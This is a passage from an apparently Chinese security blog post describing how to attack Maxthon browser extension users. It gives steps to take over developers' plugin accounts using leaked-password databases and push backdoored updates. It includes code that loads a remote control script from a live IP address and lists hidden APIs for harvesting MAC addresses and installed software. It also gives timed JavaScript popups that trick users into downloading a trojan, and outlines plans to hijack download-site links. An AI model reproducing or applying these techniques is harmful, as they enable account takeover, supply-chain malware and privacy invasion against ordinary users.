&lt;p&gt;里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去&lt;a href=&quot;https://my.maxthon.cn/recover.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;遨游账户中心-忘记密码&lt;/a&gt;先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里有个&lt;code&gt;更新文件&lt;/code&gt;，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。&lt;/p&gt;
&lt;p&gt;而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。&lt;/p&gt;
&lt;p&gt;更新的时候，就这个账户当做自己的账户就行了，然后照着0x1.2代码写上去就没问题了。&lt;/p&gt;
&lt;h5 id=&quot;0x1-4-控制插件里调用的第三方javascript代码&quot;&gt;&lt;a href=&quot;#0x1-4-控制插件里调用的第三方javascript代码&quot; class=&quot;headerlink&quot; title=&quot;0x1.4 控制插件里调用的第三方javascript代码&quot;&gt;&lt;/a&gt;0x1.4 控制插件里调用的第三方javascript代码&lt;/h5&gt;&lt;p&gt;这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不具有可视化页面&lt;/p&gt;
&lt;p&gt;具有可视化页面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h6 id=&quot;0x1-4-1-不具有可视化页面&quot;&gt;&lt;a href=&quot;#0x1-4-1-不具有可视化页面&quot; class=&quot;headerlink&quot; title=&quot;0x1.4.1 不具有可视化页面&quot;&gt;&lt;/a&gt;0x1.4.1 不具有可视化页面&lt;/h6&gt;&lt;p&gt;类似我上面所说的，在插件的&lt;code&gt;def.json&lt;/code&gt;配置文件里写上:&lt;br&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&quot;actions&quot;: [&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &quot;type&quot;: &quot;script&quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &quot;entryPoints&quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &quot;doc_onload&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &quot;js&quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &quot;base.js&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &quot;include&quot;: [&quot;*&quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &quot;includeFrames&quot;: true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后在base.js文件里写入你要调用的第三方javascript文件：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;script.src = &lt;span class=&quot;string&quot;&gt;&quot;http://119.29.58.242/control.js&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.body.appendChild(script);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的&lt;a href=&quot;http://bbs.maxthon.cn/thread-664-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MxPacker&lt;/a&gt;软件，进行的解密，首先分析&lt;code&gt;def.json&lt;/code&gt;里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。&lt;/p&gt;
&lt;p&gt;找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。&lt;/p&gt;
&lt;h6 id=&quot;0x1-4-2-具有可视化页面&quot;&gt;&lt;a href=&quot;#0x1-4-2-具有可视化页面&quot; class=&quot;headerlink&quot; title=&quot;0x1.4.2 具有可视化页面&quot;&gt;&lt;/a&gt;0x1.4.2 具有可视化页面&lt;/h6&gt;&lt;p&gt;这个比上面0x1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,tags=&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&#39;iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]&#39;&lt;/span&gt;),tag;tag=tags[i];i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  a.href = tag.src||tag.href||tag.data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a.hostname!=location.hostname)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.warn(location.hostname+&lt;span class=&quot;string&quot;&gt;&#39; 发现第三方资源[&#39;&lt;/span&gt;+tag.localName+&lt;span class=&quot;string&quot;&gt;&#39;]:&#39;&lt;/span&gt;+a.href);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用方法如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。&lt;/p&gt;
&lt;h5 id=&quot;0x1-4-3-控制插件里调用的第三方javascript代码总结&quot;&gt;&lt;a href=&quot;#0x1-4-3-控制插件里调用的第三方javascript代码总结&quot; class=&quot;headerlink&quot; title=&quot;0x1.4.3 控制插件里调用的第三方javascript代码总结&quot;&gt;&lt;/a&gt;0x1.4.3 控制插件里调用的第三方javascript代码总结&lt;/h5&gt;&lt;p&gt;这个方法较为繁琐，优点如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不容易被发现&lt;/p&gt;
&lt;p&gt;向上反查也比较难追踪&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;费时费力&lt;/p&gt;
&lt;p&gt;成功率较低&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。&lt;/p&gt;
&lt;h4 id=&quot;0x2-那些隐藏的API：&quot;&gt;&lt;a href=&quot;#0x2-那些隐藏的API：&quot; class=&quot;headerlink&quot; title=&quot;0x2 那些隐藏的API：&quot;&gt;&lt;/a&gt;0x2 那些隐藏的API：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。&lt;/p&gt;
&lt;p&gt;还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;maxthon.system.Utility.getMacAddresses() &lt;span class=&quot;comment&quot;&gt;//获取用户的MAC地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() &lt;span class=&quot;comment&quot;&gt;//获取用户当前所有的字体文&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() &lt;span class=&quot;comment&quot;&gt;//用户当前应用的字体&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;maxthon.io.File.createTempFile().name_ &lt;span class=&quot;comment&quot;&gt;//获取用户临时目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;maxthon.io.File.createTempFile().isFile &lt;span class=&quot;comment&quot;&gt;//判断name_文件是否存在，但是这里我无法重新设置name_的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下面是最新版本4.x版本的API：&lt;/p&gt;
&lt;p&gt;遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mx.app.getAvatar()    &lt;span class=&quot;comment&quot;&gt;//获得当前登录用户的头像(data:image/png;base64格式)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mx.app.login()    &lt;span class=&quot;comment&quot;&gt;//判断是否登录了遨游浏览器(登录返回true，没登陆返回false)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mx.app.getProfile()    &lt;span class=&quot;comment&quot;&gt;//获得用户当前的状态(是否登录、uid、用户名称)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mx.app.getSystemLocale()    &lt;span class=&quot;comment&quot;&gt;//获得系统语言(例如：zh-cn)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mx.app.showUserPanel()    &lt;span class=&quot;comment&quot;&gt;//显示用户菜单(相当于点击左上角的头像)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//以上的代码需要事先运行mx.app.user()、mx.app.locale()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientInformation.plugins     &lt;span class=&quot;comment&quot;&gt;//浏览器支持的插件(可看到用户安装哪些软件)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clientInformation.mimeTypes    &lt;span class=&quot;comment&quot;&gt;//列举出支持的application(可看到用户安装哪些软件)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里针对最后两个API截图看下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。&lt;/p&gt;
&lt;h4 id=&quot;0x3-攻击向量：&quot;&gt;&lt;a href=&quot;#0x3-攻击向量：&quot; class=&quot;headerlink&quot; title=&quot;0x3 攻击向量：&quot;&gt;&lt;/a&gt;0x3 攻击向量：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;普通的获取cookies我们就不说了，介绍点其他的。&lt;/p&gt;
&lt;p&gt;上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;弹窗欺骗用户说需要下载软件，其实是木马程序&lt;/p&gt;
&lt;p&gt;使用浏览器漏洞进行攻击&lt;/p&gt;
&lt;p&gt;替换下载链接&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;0x3-1-弹窗欺骗用户下载软件&quot;&gt;&lt;a href=&quot;#0x3-1-弹窗欺骗用户下载软件&quot; class=&quot;headerlink&quot; title=&quot;0x3.1 弹窗欺骗用户下载软件&quot;&gt;&lt;/a&gt;0x3.1 弹窗欺骗用户下载软件&lt;/h5&gt;&lt;p&gt;这一步很简单，就是一些简单的javascript代码：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;    &lt;span class=&quot;comment&quot;&gt;//闭包函数，防止变量污染&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&lt;span class=&quot;string&quot;&gt;&quot;请下载xxx安全插件保障您在此网站的安全&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    location.href = &lt;span class=&quot;string&quot;&gt;&quot;http://baidu.com/download/xxxx.exe&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;    &lt;span class=&quot;comment&quot;&gt;//闭包函数，防止变量污染&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downDate = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt;();  &lt;span class=&quot;comment&quot;&gt;//获取当前的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downDateY = &lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;(downDate).split(&lt;span class=&quot;string&quot;&gt;&quot; &quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;//年份&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downDateM = &lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;(downDate).split(&lt;span class=&quot;string&quot;&gt;&quot; &quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;//月份&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downDateD = &lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;(downDate).split(&lt;span class=&quot;string&quot;&gt;&quot; &quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;//日期&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downDateT = &lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;(downDate).split(&lt;span class=&quot;string&quot;&gt;&quot; &quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;].split(&lt;span class=&quot;string&quot;&gt;&quot;:&quot;&lt;/span&gt;);  &lt;span class=&quot;comment&quot;&gt;//时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href != &lt;span class=&quot;string&quot;&gt;&quot;https://baidu.com/&quot;&lt;/span&gt;)&amp;#123;  &lt;span class=&quot;comment&quot;&gt;//当不是百度时，不执行下面的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fasle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(downDateY == &lt;span class=&quot;string&quot;&gt;&quot;2016&quot;&lt;/span&gt; &amp;amp;&amp;amp; downDateM == &lt;span class=&quot;string&quot;&gt;&quot;Oct&quot;&lt;/span&gt; &amp;amp;&amp;amp; downDateD == &lt;span class=&quot;string&quot;&gt;&quot;28&quot;&lt;/span&gt; &amp;amp;&amp;amp; downDateT[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;21&quot;&lt;/span&gt; &amp;amp;&amp;amp; downDateT[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &amp;lt; &lt;span class=&quot;string&quot;&gt;&quot;30&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alert(&lt;span class=&quot;string&quot;&gt;&quot;请下载xxx安全插件保障您在此网站的安全&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        location.href = &lt;span class=&quot;string&quot;&gt;&quot;http://baidu.com/download/xxxx.exe&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是&lt;code&gt;https://baidu.com/&lt;/code&gt;时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。&lt;/p&gt;
&lt;h5 id=&quot;0x3-2-使用浏览器漏洞进行攻击&quot;&gt;&lt;a href=&quot;#0x3-2-使用浏览器漏洞进行攻击&quot; class=&quot;headerlink&quot; title=&quot;0x3.2 使用浏览器漏洞进行攻击&quot;&gt;&lt;/a&gt;0x3.2 使用浏览器漏洞进行攻击&lt;/h5&gt;&lt;p&gt;漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的&lt;code&gt;mxCall&lt;/code&gt;函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。&lt;/p&gt;
&lt;h5 id=&quot;0x3-3-替换下载链接&quot;&gt;&lt;a href=&quot;#0x3-3-替换下载链接&quot; class=&quot;headerlink&quot; title=&quot;0x3.3 替换下载链接&quot;&gt;&lt;/a&gt;0x3.3 替换下载链接&lt;/h5&gt;&lt;p&gt;替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://xiazai.zol.com.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ZOL下载-免费软件,绿色软件&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.skycn.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;天空下载站&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.onlinedown.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;华军软件园&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.skycn.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;hao123下载站&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://dl.pconline.com.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;太平洋下载中心&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://rj.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度软件中心&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
